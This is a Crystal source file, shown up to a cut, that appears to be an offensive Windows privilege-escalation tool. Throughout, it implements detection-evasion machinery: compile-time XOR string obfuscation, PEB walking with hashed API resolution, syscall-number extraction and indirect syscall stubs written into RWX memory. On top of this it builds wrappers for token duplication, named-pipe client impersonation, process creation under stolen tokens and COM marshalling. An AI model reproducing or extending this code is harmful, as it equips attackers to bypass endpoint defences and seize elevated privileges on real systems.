require "option_parser"

# ─────────────── Config ─────────────────────────────────
module Config
  @@debug_level = 0
  def self.debug_level=(v : Int32); @@debug_level = v; end
  def self.debug_level : Int32; @@debug_level; end
  def self.debug? : Bool; @@debug_level >= 1; end
  def self.verbose? : Bool; @@debug_level >= 2; end
end

def dbg(msg : String)
  puts msg if Config.verbose?
end

def dbg1(msg : String)
  puts msg if Config.debug?
end

# ─────────────── Compile-time string obfuscation ────────
macro obf(str)
  {% key = 0x5A %}
  begin
    %enc = Bytes[{% for c in str.chars %}{{c.ord ^ key}}_u8, {% end %}]
    %buf = Bytes.new(%enc.size)
    %enc.each_with_index { |b, i| %buf[i] = b ^ 0x5A_u8 }
    String.new(%buf)
  end
end

# ═════════════════════════════════════════════════════════
#  PEB Walking / Dynamic API Resolution / Indirect Syscalls
# ═════════════════════════════════════════════════════════

module PEWalk
  @@dbg_ssn_count = 0

  def self.djb2_hash(buffer : Pointer(UInt8), length : Int32) : UInt32
    h = 5381_u32
    length.times do |i|
      c = buffer[i]
      next if c == 0
      c = c &- 0x20 if c >= 0x61
      h = ((h << 5) &+ h) &+ c.to_u32
    end
    h
  end

  def self.find_peb : UInt64
    result = 0_u64
    asm("movq %gs:0x60, $0" : "=r"(result))
    result
  end

  def self.get_teb : UInt64
    result = 0_u64
    asm("movq %gs:0x30, $0" : "=r"(result))
    result
  end

  def self.get_current_pid : UInt32
    Pointer(UInt32).new(get_teb &+ 0x40).value
  end

  def self.ldr_module(module_hash : UInt32) : {UInt64, UInt32}
    peb = find_peb
    return {0_u64, 0_u32} if peb == 0

    loader_data = Pointer(UInt64).new(peb &+ 0x18).value
    return {0_u64, 0_u32} if loader_data == 0

    first = Pointer(UInt64).new(loader_data &+ 0x10).value
    return {0_u64, 0_u32} if first == 0
    current = first

    loop do
      dll_base = Pointer(UInt64).new(current &+ 0x30).value
      break if dll_base == 0

      name_len = Pointer(UInt16).new(current &+ 0x58).value
      name_buf = Pointer(UInt64).new(current &+ 0x60).value

      if name_len > 0 && name_buf != 0
        h = djb2_hash(Pointer(UInt8).new(name_buf), name_len.to_i32)
        if h == module_hash
          size = Pointer(UInt32).new(current &+ 0x40).value
          return {dll_base, size}
        end
      end

      current = Pointer(UInt64).new(current).value
      break if current == first || current == 0
    end

    {0_u64, 0_u32}
  end

  def self.ldr_function(module_base : UInt64, function_hash : UInt32) : UInt64
    return 0_u64 if module_base == 0

    dos_sig = Pointer(UInt16).new(module_base).value
    return 0_u64 if dos_sig != 0x5A4D

    e_lfanew = Pointer(Int32).new(module_base &+ 0x3C).value
    nt_headers = module_base &+ e_lfanew.to_u64

    nt_sig = Pointer(UInt32).new(nt_headers).value
    return 0_u64 if nt_sig != 0x4550

    export_rva = Pointer(UInt32).new(nt_headers &+ 0x88).value
    return 0_u64 if export_rva == 0

    export_dir = module_base &+ export_rva.to_u64
    num_names = Pointer(UInt32).new(export_dir &+ 0x18).value
    addr_funcs_rva = Pointer(UInt32).new(export_dir &+ 0x1C).value
    addr_names_rva = Pointer(UInt32).new(export_dir &+ 0x20).value
    addr_ords_rva = Pointer(UInt32).new(export_dir &+ 0x24).value

    names_ptr = module_base &+ addr_names_rva.to_u64
    funcs_ptr = module_base &+ addr_funcs_rva.to_u64
    ords_ptr = module_base &+ addr_ords_rva.to_u64

    num_names.times do |i|
      name_rva = Pointer(UInt32).new(names_ptr &+ i.to_u64 &* 4).value
      name_addr = module_base &+ name_rva.to_u64

      name_len = 0
      while Pointer(UInt8).new(name_addr &+ name_len.to_u64).value != 0
        name_len += 1
        break if name_len > 256
      end

      h = djb2_hash(Pointer(UInt8).new(name_addr), name_len)
      if h == function_hash
        ordinal = Pointer(UInt16).new(ords_ptr &+ i.to_u64 &* 2).value
        func_rva = Pointer(UInt32).new(funcs_ptr &+ ordinal.to_u64 &* 4).value
        return module_base &+ func_rva.to_u64
      end
    end

    0_u64
  end

  def self.get_ssn(target_hash : UInt32, ntdll_base : UInt64) : {Int32, UInt64}
    return {-1, 0_u64} if ntdll_base == 0

    e_lfanew = Pointer(Int32).new(ntdll_base &+ 0x3C).value
    nt_headers = ntdll_base &+ e_lfanew.to_u64

    export_rva = Pointer(UInt32).new(nt_headers &+ 0x88).value
    return {-1, 0_u64} if export_rva == 0
    export_dir = ntdll_base &+ export_rva.to_u64

    num_names = Pointer(UInt32).new(export_dir &+ 0x18).value
    funcs_rva = Pointer(UInt32).new(export_dir &+ 0x1C).value
    names_rva = Pointer(UInt32).new(export_dir &+ 0x20).value
    ords_rva = Pointer(UInt32).new(export_dir &+ 0x24).value

    funcs_ptr = ntdll_base &+ funcs_rva.to_u64
    names_ptr = ntdll_base &+ names_rva.to_u64
    ords_ptr = ntdll_base &+ ords_rva.to_u64

    exception_rva = Pointer(UInt32).new(nt_headers &+ 0xA0).value
    return {-1, 0_u64} if exception_rva == 0
    rtf = ntdll_base &+ exception_rva.to_u64

    ssn = 0_i32
    i = 0
    @@dbg_ssn_count = (@@dbg_ssn_count || 0) + 1
    first_call = (@@dbg_ssn_count == 1)

    if first_call
      dbg obf("[ssn] num_names:") + num_names.to_s
      dbg obf("[ssn] export_rva:0x") + export_rva.to_s(16) + " exception_rva:0x" + exception_rva.to_s(16)
      3.times do |k|
        ba = Pointer(UInt32).new(rtf &+ k.to_u64 &* 12).value
        dbg obf("[ssn] rtf[") + k.to_s + "].begin=0x" + ba.to_s(16)
      end
    end

    loop do
      begin_addr = Pointer(UInt32).new(rtf &+ i.to_u64 &* 12).value
      break if begin_addr == 0

      matched_export = false
      num_names.times do |j|
        ordinal = Pointer(UInt16).new(ords_ptr &+ j.to_u64 &* 2).value
        func_rva = Pointer(UInt32).new(funcs_ptr &+ ordinal.to_u64 &* 4).value

        if func_rva == begin_addr
          matched_export = true
          name_rva_val = Pointer(UInt32).new(names_ptr &+ j.to_u64 &* 4).value
          name_addr = ntdll_base &+ name_rva_val.to_u64

          name_len = 0
          while Pointer(UInt8).new(name_addr &+ name_len.to_u64).value != 0
            name_len += 1
            break if name_len > 256
          end

          fname = String.new(Pointer(UInt8).new(name_addr), name_len)
          h = djb2_hash(Pointer(UInt8).new(name_addr), name_len)

          if first_call && i < 5
            dbg obf("[ssn] i:") + i.to_s + " j:" + j.to_s + " rva:0x" + begin_addr.to_s(16) + " " + fname + " h:0x" + h.to_s(16)
          end

          if h == target_hash
            dbg obf("[ssn] MATCH ") + fname + " h:0x" + h.to_s(16) + " ssn:" + ssn.to_s
            return {ssn, ntdll_base &+ func_rva.to_u64}
          end

          if name_len >= 2
            c0 = Pointer(UInt8).new(name_addr).value
            c1 = Pointer(UInt8).new(name_addr &+ 1).value
            if c0 == 0x5A && c1 == 0x77
              ssn += 1
            end
          end
        end
      end

      if first_call && !matched_export && i < 3
        dbg obf("[ssn] i:") + i.to_s + " rva:0x" + begin_addr.to_s(16) + " NO EXPORT MATCH"
      end

      i += 1
    end

    {-1, 0_u64}
  end
end

# ─────────────── Dynamic Call via Inline ASM ────────────
module DynCall
  STUB_SIZE = 21

  def self.write_stub(base : UInt64, index : Int32, ssn : Int32, func_addr : UInt64) : UInt64
    offset = base &+ (index &* STUB_SIZE).to_u64
    target = func_addr &+ 0x12
    ptr = Pointer(UInt8).new(offset)
    ptr[0] = 0x49_u8; ptr[1] = 0x89_u8; ptr[2] = 0xCA_u8
    ptr[3] = 0xB8_u8
    ptr[4] = (ssn & 0xFF).to_u8
    ptr[5] = ((ssn >> 8) & 0xFF).to_u8
    ptr[6] = 0x00_u8; ptr[7] = 0x00_u8
    ptr[8] = 0x49_u8; ptr[9] = 0xBB_u8
    8.times { |i| ptr[10 + i] = ((target >> (i &* 8)) & 0xFF).to_u8 }
    ptr[18] = 0x41_u8; ptr[19] = 0xFF_u8; ptr[20] = 0xE3_u8
    offset
  end

  def self.bootstrap_virtual_alloc(va_addr : UInt64, size : UInt64) : UInt64
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x20, %rsp
      xorl %ecx, %ecx
      movl $$0x3000, %r8d
      movl $$0x40, %r9d
      callq *$2
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rdx}"(size), "r"(va_addr) : "rbx", "rcx", "r8", "r9", "r10", "r11", "memory")
    result
  end

  def self.call0(addr : UInt64) : UInt64
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x20, %rsp
      callq *$1
      movq %rbx, %rsp
    " : "={rax}"(result) : "r"(addr) : "rbx", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory")
    result
  end

  def self.call1(addr : UInt64, a1 : UInt64) : UInt64
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x20, %rsp
      callq *$2
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rcx}"(a1), "r"(addr) : "rbx", "rdx", "r8", "r9", "r10", "r11", "memory")
    result
  end

  def self.call2(addr : UInt64, a1 : UInt64, a2 : UInt64) : UInt64
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x20, %rsp
      callq *$3
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "r"(addr) : "rbx", "r8", "r9", "r10", "r11", "memory")
    result
  end

  def self.call3(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64) : UInt64
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x20, %rsp
      callq *$4
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "r"(addr) : "rbx", "r9", "r10", "r11", "memory")
    result
  end

  def self.call4(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64) : UInt64
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x20, %rsp
      callq *$5
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr) : "rbx", "r10", "r11", "memory")
    result
  end

  def self.call5(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
                 a5 : UInt64) : UInt64
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x30, %rsp
      movq $6, 0x20(%rsp)
      callq *$5
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr), "r"(a5) : "rbx", "r10", "r11", "memory")
    result
  end

  def self.call6(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
                 a5 : UInt64, a6 : UInt64) : UInt64
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x30, %rsp
      movq $6, 0x20(%rsp)
      movq $7, 0x28(%rsp)
      callq *$5
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr), "r"(a5), "r"(a6) : "rbx", "r10", "r11", "memory")
    result
  end

  def self.call7(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
                 a5 : UInt64, a6 : UInt64, a7 : UInt64) : UInt64
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x40, %rsp
      movq $6, 0x20(%rsp)
      movq $7, 0x28(%rsp)
      movq $8, 0x30(%rsp)
      callq *$5
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr), "r"(a5), "r"(a6), "r"(a7) : "rbx", "r10", "r11", "memory")
    result
  end

  def self.call8(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
                 a5 : UInt64, a6 : UInt64, a7 : UInt64, a8 : UInt64) : UInt64
    buf = uninitialized UInt64[4]
    buf[0] = a5; buf[1] = a6; buf[2] = a7; buf[3] = a8
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x40, %rsp
      movq 0x00($6), %rdi
      movq %rdi, 0x20(%rsp)
      movq 0x08($6), %rdi
      movq %rdi, 0x28(%rsp)
      movq 0x10($6), %rdi
      movq %rdi, 0x30(%rsp)
      movq 0x18($6), %rdi
      movq %rdi, 0x38(%rsp)
      callq *$5
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr),
        "r"(buf.to_unsafe)
      : "rbx", "rdi", "r10", "r11", "memory")
    result
  end

  def self.call9(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
                 a5 : UInt64, a6 : UInt64, a7 : UInt64, a8 : UInt64, a9 : UInt64) : UInt64
    buf = uninitialized UInt64[5]
    buf[0] = a5; buf[1] = a6; buf[2] = a7; buf[3] = a8; buf[4] = a9
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x50, %rsp
      movq 0x00($6), %rdi
      movq %rdi, 0x20(%rsp)
      movq 0x08($6), %rdi
      movq %rdi, 0x28(%rsp)
      movq 0x10($6), %rdi
      movq %rdi, 0x30(%rsp)
      movq 0x18($6), %rdi
      movq %rdi, 0x38(%rsp)
      movq 0x20($6), %rdi
      movq %rdi, 0x40(%rsp)
      callq *$5
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr),
        "r"(buf.to_unsafe)
      : "rbx", "rdi", "r10", "r11", "memory")
    result
  end

  def self.call11(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
                  a5 : UInt64, a6 : UInt64, a7 : UInt64, a8 : UInt64,
                  a9 : UInt64, a10 : UInt64, a11 : UInt64) : UInt64
    buf = uninitialized UInt64[7]
    buf[0] = a5; buf[1] = a6; buf[2] = a7; buf[3] = a8
    buf[4] = a9; buf[5] = a10; buf[6] = a11
    result = 0_u64
    asm("
      movq %rsp, %rbx
      andq $$-16, %rsp
      subq $$0x60, %rsp
      movq 0x00($6), %rdi
      movq %rdi, 0x20(%rsp)
      movq 0x08($6), %rdi
      movq %rdi, 0x28(%rsp)
      movq 0x10($6), %rdi
      movq %rdi, 0x30(%rsp)
      movq 0x18($6), %rdi
      movq %rdi, 0x38(%rsp)
      movq 0x20($6), %rdi
      movq %rdi, 0x40(%rsp)
      movq 0x28($6), %rdi
      movq %rdi, 0x48(%rsp)
      movq 0x30($6), %rdi
      movq %rdi, 0x50(%rsp)
      callq *$5
      movq %rbx, %rsp
    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr),
        "r"(buf.to_unsafe)
      : "rbx", "rdi", "r10", "r11", "memory")
    result
  end
end

# ─────────────── Syscall & DynApi State ─────────────────
module SysState
  # Syscall stubs (SSN + address resolved from ntdll exception directory)
  @@nt_close = 0_u64
  @@nt_query_sys_info = 0_u64
  @@nt_open_process = 0_u64
  @@nt_open_process_token = 0_u64
  @@nt_open_thread_token = 0_u64
  @@nt_duplicate_token = 0_u64
  @@nt_query_info_token = 0_u64
  @@nt_duplicate_object = 0_u64
  @@nt_wait_single = 0_u64
  @@nt_protect_vm = 0_u64

  # Dynamic function addresses (kernel32 / advapi32)
  @@create_named_pipe_w = 0_u64
  @@connect_named_pipe = 0_u64
  @@peek_named_pipe = 0_u64
  @@create_proc_token_w = 0_u64
  @@create_proc_user_w = 0_u64
  @@impersonate_pipe = 0_u64
  @@revert_to_self = 0_u64
  @@convert_sd = 0_u64
  @@open_thread_token_k32 = 0_u64

  @@initialized = false

  SYSCALL_HASHES = {
    nt_close:              0x40d6e69d_u32,
    nt_query_sys_info:     0x7bc23928_u32,
    nt_open_process:       0x4b82f718_u32,
    nt_open_process_token: 0x350dca99_u32,
    nt_open_thread_token:  0x803347d2_u32,
    nt_duplicate_token:    0x8e160b23_u32,
    nt_query_info_token:   0x0f371fe4_u32,
    nt_duplicate_object:   0x4441d859_u32,
    nt_wait_single:        0xe8ac0c3c_u32,
    nt_protect_vm:         0x50e92888_u32,
  }

  private def self.resolve_one(name : String, hash : UInt32, ntdll_base : UInt64,
                                rwx_base : UInt64, idx : Int32) : UInt64
    ssn, addr = PEWalk.get_ssn(hash, ntdll_base)
    if ssn >= 0
      stub = DynCall.write_stub(rwx_base, idx, ssn, addr)
      dbg obf("[+] ") + name + " ssn:" + ssn.to_s + " @0x" + stub.to_s(16)
      stub
    else
      dbg obf("[-] ") + name + " NOT FOUND"
      0_u64
    end
  end

  def self.init
    return if @@initialized

    dbg obf("[*] SysState.init start")

    ntdll_base, _ = PEWalk.ldr_module(0x1edab0ed_u32)
    dbg obf("[*] ntdll:0x") + ntdll_base.to_s(16)
    raise obf("ntdll not found") if ntdll_base == 0

    k32_base, _ = PEWalk.ldr_module(0x6ddb9555_u32)
    dbg obf("[*] k32:0x") + k32_base.to_s(16)
    raise obf("kernel32 not found") if k32_base == 0

    va_addr = PEWalk.ldr_function(k32_base, 0x097bc257_u32)
    dbg obf("[*] VA:0x") + va_addr.to_s(16)
    raise obf("VirtualAlloc not found") if va_addr == 0

    stub_count = 10
    rwx_size = (stub_count * DynCall::STUB_SIZE + 0xFFF) & ~0xFFF
    rwx_base = DynCall.bootstrap_virtual_alloc(va_addr, rwx_size.to_u64)
    dbg obf("[*] rwx:0x") + rwx_base.to_s(16)
    raise obf("VirtualAlloc failed") if rwx_base == 0

    @@nt_close            = resolve_one(obf("NC"),  0x40d6e69d_u32, ntdll_base, rwx_base, 0)
    @@nt_query_sys_info   = resolve_one(obf("QSI"), 0x7bc23928_u32, ntdll_base, rwx_base, 1)
    @@nt_open_process     = resolve_one(obf("OP"),  0x4b82f718_u32, ntdll_base, rwx_base, 2)
    @@nt_open_process_token = resolve_one(obf("OPT"), 0x350dca99_u32, ntdll_base, rwx_base, 3)
    @@nt_open_thread_token = resolve_one(obf("OTT"), 0x803347d2_u32, ntdll_base, rwx_base, 4)
    @@nt_duplicate_token  = resolve_one(obf("DT"),  0x8e160b23_u32, ntdll_base, rwx_base, 5)
    @@nt_query_info_token = resolve_one(obf("QIT"), 0x0f371fe4_u32, ntdll_base, rwx_base, 6)
    @@nt_duplicate_object = resolve_one(obf("DO"),  0x4441d859_u32, ntdll_base, rwx_base, 7)
    @@nt_wait_single      = resolve_one(obf("WS"),  0xe8ac0c3c_u32, ntdll_base, rwx_base, 8)
    @@nt_protect_vm       = resolve_one(obf("PVM"), 0x50e92888_u32, ntdll_base, rwx_base, 9)

    resolve_k32(k32_base)
    resolve_advapi32

    dbg obf("[*] SysState.init done")
    @@initialized = true
  end

  private def self.resolve_k32(k32_base : UInt64)
    @@create_named_pipe_w = PEWalk.ldr_function(k32_base, 0xa05e2a83_u32)
    @@connect_named_pipe = PEWalk.ldr_function(k32_base, 0x436e4c62_u32)
    @@peek_named_pipe = PEWalk.ldr_function(k32_base, 0xd5312e5d_u32)
    @@open_thread_token_k32 = PEWalk.ldr_function(k32_base, 0xe249d070_u32)
    dbg obf("[k32] cnpw=0x") + @@create_named_pipe_w.to_s(16) + " cnp=0x" + @@connect_named_pipe.to_s(16) + " pnp=0x" + @@peek_named_pipe.to_s(16)
  end

  private def self.resolve_advapi32
    adv_base, _ = PEWalk.ldr_module(0x64bb3129_u32)
    if adv_base == 0
      dbg obf("[adv32] NOT FOUND in PEB")
      return
    end
    dbg obf("[adv32] base=0x") + adv_base.to_s(16)

    @@create_proc_token_w = PEWalk.ldr_function(adv_base, 0xf3e5480c_u32)
    @@create_proc_user_w = PEWalk.ldr_function(adv_base, 0xedbe7a62_u32)
    @@impersonate_pipe = PEWalk.ldr_function(adv_base, 0xefdd3d9e_u32)
    @@revert_to_self = PEWalk.ldr_function(adv_base, 0x7292758a_u32)
    @@convert_sd = PEWalk.ldr_function(adv_base, 0xd93ad585_u32)
    dbg obf("[adv32] convert_sd=0x") + @@convert_sd.to_s(16) + " impersonate=0x" + @@impersonate_pipe.to_s(16)

    if @@open_thread_token_k32 == 0
      @@open_thread_token_k32 = PEWalk.ldr_function(adv_base, 0xe249d070_u32)
    end
  end

  # ─── Syscall wrappers ───

  def self.nt_close(handle : Pointer(Void)) : Int32
    DynCall.call1(@@nt_close, handle.address.to_u64).to_i32!
  end

  def self.nt_query_system_information(info_class : UInt32, buf : Pointer(Void),
                                       buf_len : UInt32, ret_len : Pointer(UInt32)) : UInt32
    DynCall.call4(@@nt_query_sys_info,
      info_class.to_u64, buf.address.to_u64,
      buf_len.to_u64, ret_len.address.to_u64).to_u32!
  end

  def self.nt_open_process(handle_out : Pointer(Pointer(Void)), access : UInt32,
                           oa : Pointer(Void), cid : Pointer(Void)) : Int32
    DynCall.call4(@@nt_open_process,
      handle_out.address.to_u64, access.to_u64,
      oa.address.to_u64, cid.address.to_u64).to_i32!
  end

  def self.nt_open_process_token(process : Pointer(Void), access : UInt32,
                                  token_out : Pointer(Pointer(Void))) : Int32
    DynCall.call3(@@nt_open_process_token,
      process.address.to_u64, access.to_u64,
      token_out.address.to_u64).to_i32!
  end

  def self.nt_open_thread_token(thread : Pointer(Void), access : UInt32,
                                 open_as_self : Int32, token_out : Pointer(Pointer(Void))) : Int32
    DynCall.call4(@@nt_open_thread_token,
      thread.address.to_u64, access.to_u64,
      open_as_self.to_u64, token_out.address.to_u64).to_i32!
  end

  def self.nt_query_information_token(token : Pointer(Void), info_class : UInt32,
                                       buf : Pointer(Void), buf_len : UInt32,
                                       ret_len : Pointer(UInt32)) : Int32
    DynCall.call5(@@nt_query_info_token,
      token.address.to_u64, info_class.to_u64,
      buf.address.to_u64, buf_len.to_u64,
      ret_len.address.to_u64).to_i32!
  end

  def self.nt_duplicate_token(existing : Pointer(Void), access : UInt32,
                               oa : Pointer(Void), imp_level : UInt32,
                               token_type : UInt32, new_token : Pointer(Pointer(Void))) : Int32
    DynCall.call6(@@nt_duplicate_token,
      existing.address.to_u64, access.to_u64,
      oa.address.to_u64, imp_level.to_u64,
      token_type.to_u64, new_token.address.to_u64).to_i32!
  end

  def self.nt_duplicate_object(src_proc : Pointer(Void), src_handle : Pointer(Void),
                                tgt_proc : Pointer(Void), tgt_handle : Pointer(Pointer(Void)),
                                access : UInt32, attrs : UInt32, options : UInt32) : Int32
    DynCall.call7(@@nt_duplicate_object,
      src_proc.address.to_u64, src_handle.address.to_u64,
      tgt_proc.address.to_u64, tgt_handle.address.to_u64,
      access.to_u64, attrs.to_u64, options.to_u64).to_i32!
  end

  def self.nt_wait_for_single_object(handle : Pointer(Void), alertable : Int32,
                                      timeout : Pointer(Void)) : Int32
    DynCall.call3(@@nt_wait_single,
      handle.address.to_u64, alertable.to_u64,
      timeout.address.to_u64).to_i32!
  end

  def self.nt_protect_virtual_memory(process : Pointer(Void), base_addr : Pointer(Pointer(Void)),
                                      region_size : Pointer(UInt64), new_prot : UInt32,
                                      old_prot : Pointer(UInt32)) : Int32
    DynCall.call5(@@nt_protect_vm,
      process.address.to_u64, base_addr.address.to_u64,
      region_size.address.to_u64, new_prot.to_u64,
      old_prot.address.to_u64).to_i32!
  end

  # ─── Dynamic API wrappers ───

  def self.create_named_pipe_w(name : Pointer(UInt16), open_mode : UInt32, pipe_mode : UInt32,
                                max_inst : UInt32, out_buf : UInt32, in_buf : UInt32,
                                timeout : UInt32, security : Pointer(Void)) : Pointer(Void)
    r = DynCall.call8(@@create_named_pipe_w,
      name.address.to_u64, open_mode.to_u64, pipe_mode.to_u64, max_inst.to_u64,
      out_buf.to_u64, in_buf.to_u64, timeout.to_u64, security.address.to_u64)
    Pointer(Void).new(r)
  end

  def self.connect_named_pipe(pipe : Pointer(Void), overlapped : Pointer(Void)) : Int32
    DynCall.call2(@@connect_named_pipe,
      pipe.address.to_u64, overlapped.address.to_u64).to_i32!
  end

  def self.peek_named_pipe(pipe : Pointer(Void), buffer : Pointer(UInt8), size : UInt32,
                            read : Pointer(UInt32), avail : Pointer(UInt32),
                            left : Pointer(UInt32)) : Int32
    DynCall.call6(@@peek_named_pipe,
      pipe.address.to_u64, buffer.address.to_u64, size.to_u64,
      read.address.to_u64, avail.address.to_u64, left.address.to_u64).to_i32!
  end

  def self.impersonate_named_pipe_client(pipe : Pointer(Void)) : Int32
    DynCall.call1(@@impersonate_pipe, pipe.address.to_u64).to_i32!
  end

  def self.revert_to_self : Int32
    DynCall.call0(@@revert_to_self).to_i32!
  end

  def self.dbg_convert_sd : UInt64
    @@convert_sd
  end

  def self.dbg_create_named_pipe_w : UInt64
    @@create_named_pipe_w
  end

  def self.convert_sd_w(sd_str : Pointer(UInt16), revision : UInt32,
                         out_sd : Pointer(Pointer(Void)), out_size : Pointer(UInt32)) : Int32
    DynCall.call4(@@convert_sd,
      sd_str.address.to_u64, revision.to_u64,
      out_sd.address.to_u64, out_size.address.to_u64).to_i32!
  end

  def self.open_thread_token(thread : Pointer(Void), access : UInt32,
                              open_as_self : Int32, token_out : Pointer(Pointer(Void))) : Int32
    DynCall.call4(@@open_thread_token_k32,
      thread.address.to_u64, access.to_u64,
      open_as_self.to_u64, token_out.address.to_u64).to_i32!
  end

  def self.create_process_with_token_w(token : Pointer(Void), logon_flags : UInt32,
                                        app : Pointer(UInt16), cmdline : Pointer(UInt16),
                                        creation : UInt32, env : Pointer(Void),
                                        dir : Pointer(UInt16), si : Pointer(Void),
                                        pi : Pointer(Void)) : Int32
    DynCall.call9(@@create_proc_token_w,
      token.address.to_u64, logon_flags.to_u64,
      app.address.to_u64, cmdline.address.to_u64,
      creation.to_u64, env.address.to_u64,
      dir.address.to_u64, si.address.to_u64,
      pi.address.to_u64).to_i32!
  end

  def self.create_process_as_user_w(token : Pointer(Void), app : Pointer(UInt16),
                                     cmdline : Pointer(UInt16), proc_attr : Pointer(Void),
                                     thread_attr : Pointer(Void), inherit : Int32,
                                     creation : UInt32, env : Pointer(Void),
                                     dir : Pointer(UInt16), si : Pointer(Void),
                                     pi : Pointer(Void)) : Int32
    DynCall.call11(@@create_proc_user_w,
      token.address.to_u64, app.address.to_u64,
      cmdline.address.to_u64, proc_attr.address.to_u64,
      thread_attr.address.to_u64, inherit.to_u64,
      creation.to_u64, env.address.to_u64,
      dir.address.to_u64, si.address.to_u64,
      pi.address.to_u64).to_i32!
  end
end


# ─────────────── Lib blocks (non-stdlib Win32 only) ─────
@[Link("kernel32")]
lib WinExtra
  fun GlobalAlloc(uFlags : UInt32, dwBytes : UInt64) : Void*
  fun GlobalLock(hMem : Void*) : Void*
  fun GlobalUnlock(hMem : Void*) : Int32
  fun CreatePipe(hReadPipe : Void**, hWritePipe : Void**, lpPipeAttributes : Void*, nSize : UInt32) : Int32
  fun SetHandleInformation(hObject : Void*, dwMask : UInt32, dwFlags : UInt32) : Int32
  fun CreateThread(lpThreadAttributes : Void*, dwStackSize : UInt64,
    lpStartAddress : Pointer(Void) -> UInt32, lpParameter : Void*,
    dwCreationFlags : UInt32, lpThreadId : UInt32*) : Void*
  fun VirtualProtect(lpAddress : Void*, dwSize : UInt64, flNewProtect : UInt32, lpflOldProtect : UInt32*) : Int32
  fun PeekNamedPipe(hNamedPipe : Void*, lpBuffer : Void*, nBufferSize : UInt32,
    lpBytesRead : UInt32*, lpTotalBytesAvail : UInt32*, lpBytesLeftThisMessage : UInt32*) : Int32
end

@[Link("ws2_32")]
lib LibC
  fun inet_addr(cp : UInt8*) : UInt32
  fun select(nfds : Int32, readfds : Void*, writefds : Void*, exceptfds : Void*, timeout : Void*) : Int32
end

lib LibGC
  struct GcStackBase
    mem_base : Void*
  end
  fun GC_register_my_thread(sb : GcStackBase*) : Int32
  fun GC_unregister_my_thread() : Void
  fun GC_get_stack_base(sb : GcStackBase*) : Int32
end

@[Link("ole32")]
lib Ole32
  fun CoInitializeEx(reserved : Void*, coinit : UInt32) : Int32
  fun CoUninitialize() : Void
  fun CreateStreamOnHGlobal(hglobal : Void*, delete_on_release : Int32, stm : Void**) : Int32
  fun GetHGlobalFromStream(stm : Void*, hglobal : Void**) : Int32
  fun CoMarshalInterface(stm : Void*, riid : Void*, punk : Void*,
    ctx : UInt32, reserved : Void*, flags : UInt32) : Int32
  fun CoUnmarshalInterface(stm : Void*, riid : Void*, ppv : Void**) : Int32
end


# ─────────────── Constants ──────────────────────────────
CURRENT_PROCESS = Pointer(Void).new(UInt64::MAX)
CURRENT_THREAD  = Pointer(Void).new(UInt64::MAX &- 1)
INVALID_HANDLE_VALUE = Pointer(Void).new(UInt64::MAX)

PIPE_ACCESS_DUPLEX       = 0x03_u32
PIPE_TYPE_BYTE           = 0x00_u32
PIPE_READMODE_BYTE       = 0x00_u32
PIPE_WAIT                = 0x00_u32
PIPE_UNLIMITED_INSTANCES = 255_u32
ERROR_PIPE_CONNECTED     = 0x217_u32

PAGE_READWRITE = 0x04_u32

TOKEN_ASSIGN_PRIMARY    = 0x0001_u32
TOKEN_DUPLICATE         = 0x0002_u32
TOKEN_IMPERSONATE       = 0x0004_u32
TOKEN_QUERY             = 0x0008_u32
TOKEN_QUERY_SOURCE      = 0x0010_u32
TOKEN_ADJUST_PRIVILEGES = 0x0020_u32
TOKEN_ADJUST_GROUPS     = 0x0040_u32
TOKEN_ADJUST_DEFAULT    = 0x0080_u32
TOKEN_ADJUST_SESSIONID  = 0x0100_u32
TOKEN_ELEVATION = TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE |
  TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES |
